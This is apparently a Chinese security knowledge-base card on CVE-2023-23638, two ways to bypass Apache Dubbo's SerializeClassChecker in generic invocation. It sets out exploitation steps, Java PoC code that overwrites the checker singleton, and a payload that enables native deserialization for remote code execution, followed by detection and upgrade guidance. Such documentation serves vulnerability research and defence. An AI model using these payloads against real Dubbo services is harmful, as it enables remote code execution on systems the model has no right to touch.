---
id: web-java-deser-hessian-dubbo-generic-filter-serializeclasschecker-bypass
title: Dubbo SerializeClassChecker 绕过（CVE-2023-23638）：native 模式用 System/ConfigUtils 打开开关、raw.return 用 Map 改写单例字段
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: dubbo-serializeclasschecker-bypass
tags:
- java
- dubbo
- deserialization
- bypass
- serializeclasschecker
- generic-invocation
- rce
cve:
- CVE-2023-23638
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: 3.0.x <= 3.0.13；3.1.x <= 3.1.5（原文）
verification:
  verified_by: verifier-V622
  verified_at: '2026-11-12T22:07:26+08:00'
  notes: 已对照原文与全部40张图核对：图21 realize0 中 SerializeClassChecker.getInstance().validateClass(className)；图22 CLASS_DESERIALIZE_BLOCKED_SET 含 org.apache.xbean. 等前缀；图23 getProperties：class=java.lang.System + properties(dubbo.security.serialize.generic.native-java-enable=true, serialization.security.check=false)；图24 单例 INSTANCE 结构；图25 getBypassPayload 以 ConcurrentHashSet 空黑名单实例覆盖 INSTANCE；图26 checkSerializable 取 dubbo.application.check-serializable 默认 true；图27 validateClass 要求 Serializable 并打印 Trigger the safety barrier!。受影响版本原文正文明确写“Apache Dubbo 3.0.x <= 3.0.13；3.1.x <= 3.1.5”，库内 affected_versions 已按原文标记。卡中 3.0.14+/3.1.6+ 为受影响区间补集，原文未明写修复版本，仅作升级建议。dedup 10候选均 related/new，与 pts-emptyclassarray、resolveproxyclass-hutool 机制不同，非同链。未验证点：未实际构造 Hessian 字节流复现两条绕过。
url: /docs/web/java/deserialization/hessian/web-java-deser-hessian-dubbo-generic-filter-serializeclasschecker-bypass/
draft: false
kb_aliases:
- CVE-2023-23638
- Dubbo SerializeClassChecker 绕过
- raw.return 改写 INSTANCE
- dubbo.security.serialize.generic.native-java-enable 开启
- check-serializable 绕过
- CLASS_DESERIALIZE_BLOCKED_SET 置空
---

## 一句话结论

Dubbo 为泛化调用反序列化加入 `SerializeClassChecker`（要求类实现 Serializable 并套黑名单）后，仍可用 raw.return 的实化能力绕过：一是用 `java.lang.System`/`ConfigUtils` 的 `properties` 字段把 `dubbo.security.serialize.generic.native-java-enable` 置 true，再走 native 二次反序列化；二是把 `SerializeClassChecker.INSTANCE` 替换为 `CLASS_DESERIALIZE_BLOCKED_SET` 为空的实例，使黑名单与可序列化检查同时失效（CVE-2023-23638）。

## 原理

- **补丁机制**：`GenericFilter` 在 raw.return 的 `realize0` 中对 Map 的 `class` 调用 `SerializeClassChecker.getInstance().validateClass(className)`；`checkSerializable` 默认取 `dubbo.application.check-serializable`（默认 true），要求目标类实现 `Serializable`，并检查 `CLASS_DESERIALIZE_BLOCKED_SET` 前缀黑名单（含 `org.apache.xbean.`、`com.alibaba.druid.`、`org.apache.axis2.` 等）。
- **绕过一（native 二次反序列化）**：`native` 泛化模式的判断入口在检查器之外——它只受 `dubbo.security.serialize.generic.native-java-enable` 开关约束。用 raw.return 实化 `java.lang.System`，把 `properties` 字段设成含有 `dubbo.security.serialize.generic.native-java-enable=true`（以及 `serialization.security.check=false`）的 `Properties`，即等价于 `System.setProperties` 修改 Dubbo 属性；也可用 `org.apache.dubbo.common.utils.ConfigUtils.setProperties`。开关打开后，同一泛化请求改用 native 参数（byte[] 原生序列化数据），由 `NativeJavaObjectInput` 直接 `ObjectInputStream.readObject`，完全绕过 SerializeClassChecker。
- **绕过二（raw.return 改写单例）**：`SerializeClassChecker` 是单例（`INSTANCE` 静态字段）。继续用 raw.return 先实化一个 `SerializeClassChecker` 实例并把其 `CLASS_DESERIALIZE_BLOCKED_SET` 字段设为空 `ConcurrentHashSet`，再用一个 Map 把 `SerializeClassChecker.INSTANCE` 覆盖成这个“空检查器”；之后 `getInstance()` 返回的实例 `checkSerializable`/黑名单均失效，任意类（如 `JndiConverter`）可继续被实化利用。
- **为什么成立**：绕过方法没有触碰检查逻辑本身，而是利用同一个 raw.return 实化原语修改“检查器的配置/实例”——检查器的状态与本体都存在可被反射写入的字段，且 native 路径与 raw.return 路径的防护不一致。

## 触发条件

- Dubbo 版本在修复前：3.0.x <= 3.0.13、3.1.x <= 3.1.5（`SerializeClassChecker` 已引入但有上述绕过）。
- 网络可达 Dubbo 协议端口，服务允许泛化调用（`$invoke`）。
- raw.return 可用于修改 `System`/`ConfigUtils` 属性或 `SerializeClassChecker.INSTANCE`；或目标 classpath 存在可用的原生反序列化 gadget（native 方案）。

## 利用步骤

1. 先按 CVE-2021-30179 的泛化请求格式构造 `$invoke`（desc 为三项 `String;String[];Object[]`）。
2. 绕过一（native）：
   - 发送 raw.return 参数：`class=java.lang.System`、`properties={"dubbo.security.serialize.generic.native-java-enable":"true","serialization.security.check":"false"}`；
   - 再发送 `generic=nativejava` 的参数，参数值为原生序列化的 gadget 字节（二次反序列化）。
3. 绕过二（raw.return）：
   - 先实化一个空检查器：`{class: org.apache.dubbo.common.utils.SerializeClassChecker, CLASS_DESERIALIZE_BLOCKED_SET: new ConcurrentHashSet()}`；
   - 再发送 `{class: org.apache.dubbo.common.utils.SerializeClassChecker, INSTANCE: <上一个实例>}` 覆盖静态单例；
   - 然后发送原本会被拦截的 raw.return 利用 Map（如 `JndiConverter`）。
4. 按 CVE-2021-30179 的 gadget 触发命令执行；验证 `Trigger the safety barrier!` 日志消失。

## PoC

原文的 raw.return 绕过 payload 结构（Hessian2 序列化后发送）：

```java
// 1) 造一个空黑名单的检查器实例
HashMap<String,Object> instanceMap = new HashMap<>();
instanceMap.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
instanceMap.put("CLASS_DESERIALIZE_BLOCKED_SET", new ConcurrentHashSet<>());

// 2) 用 Map 覆盖静态单例 INSTANCE
HashMap<String,Object> scc = new HashMap<>();
scc.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
scc.put("INSTANCE", instanceMap);
out.writeObject(new Object[]{scc});

// 3) 之后即可用 raw.return 实化任意被拦类
HashMap<String,Object> map = new HashMap<>();
map.put("generic", "raw.return");
out.writeObject(map);
```

native 开关 payload：

```text
class=java.lang.System
properties=dubbo.security.serialize.generic.native-java-enable=true
           serialization.security.check=false
```

说明：原文给出了 payload 构造代码与检查器源码对比，未给出完整可执行工程；native 方案还需目标允许 `Properties` 字段写入并成功加载 gadget 字节。

## 变体与关联

- 变体：同类“改检查器状态”的思路还包括把 `OPEN_CHECK_CLASS` 置 false、清空 `CLASS_BLOCK_LFU_CACHE`（原文截图中的缓存字段）；只要检查器状态可被实化写入即成立。
- 关联：[[web-java-deser-hessian-dubbo-generic-filter-realize-deserialization]]（前置的 GenericFilter 实化入口与三种 generic 模式）、[[web-java-deser-hessian-dubbo-pts-emptyclassarray-filter-bypass]]（另一个 Dubbo 泛化调用检查绕过，走 pts 判定）。
- 边界：修复版本（3.0.14+/3.1.6+）中 `ConfigUtils`、`System`、`SerializeClassChecker` 均未实现 Serializable，且 native 开关默认关闭，两条绕过均失效。

## 检测与防御

- 升级到 Dubbo 3.0.14+/3.1.6+ 或更高版本；保持 `dubbo.security.serialize.generic.native-java-enable=false`。
- 关闭不必要的泛化调用；对 `$invoke` 请求解析 `generic` 与参数内容，拒绝 `class` 值为 `java.lang.System`/`ConfigUtils`/`SerializeClassChecker` 或含 `INSTANCE`/`properties` 键的 Map。
- 检测：provider 日志中 `Trigger the safety barrier!` 突然消失但仍有高频泛化调用；`System.setProperties`/`ConfigUtils.setProperties` 相关类加载；native 序列化魔数 `AC ED` 出现在参数流中。
- 防御：启用 `dubbo.application.check-serializable=true`（默认），并额外在 RPC 网关做类名白名单；限制 Dubbo 端口暴露。
